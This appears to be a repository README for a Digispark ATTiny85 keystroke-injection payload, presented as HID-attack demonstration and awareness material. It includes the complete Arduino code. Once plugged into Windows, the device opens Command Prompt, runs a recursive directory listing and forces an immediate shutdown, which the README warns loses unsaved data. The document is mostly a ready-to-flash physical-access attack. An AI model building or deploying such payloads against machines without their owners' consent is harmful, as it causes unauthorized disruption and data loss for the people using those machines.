# Digispark Command Prompt Shutdown (ATTiny85)

This Digispark (ATTiny85) script emulates a USB keyboard to automatically open Command Prompt, execute a sequence of commands, and then shut down the Windows system.


# What This Script Does

## When plugged into a Windows machine, the Digispark performs the following actions:

* Opens the Run dialog (Win + R).

* Launches Command Prompt.

* Changes the console color to red (color C).

* Executes a recursive directory listing: dir /s


# Immediately shuts down the system: 

shutdown -s -t 0


# Exits Command Prompt

All actions are automated and executed very quickly.


# How It Works

* Uses the DigiKeyboard library.

* Emulates a USB HID keyboard.

* Requires no drivers.

* Relies on keystroke injection rather than exploits.

* Executes before most users can react.


# Code
```bash
#include "DigiKeyboard.h"

void setup()
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("CMD");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("color C");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("dir /s");  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("shutdown -s -t 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("EXIT");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
}

void loop() { }
```

# Requirements

* Digispark ATTiny85.

* Arduino IDE.

* Digispark board support.

* DigiKeyboard library.

* Windows OS (tested).


# Warning

Causes immediate system shutdown.

Any unsaved data will be lost.

May stress storage devices due to dir /s.

Never run on systems you do not own or have permission to test.


# Educational Use Cases

HID attack demonstrations.

Physical access security testing.

Red team / blue team lab exercises.

USB attack awareness training.

Digispark automation learning.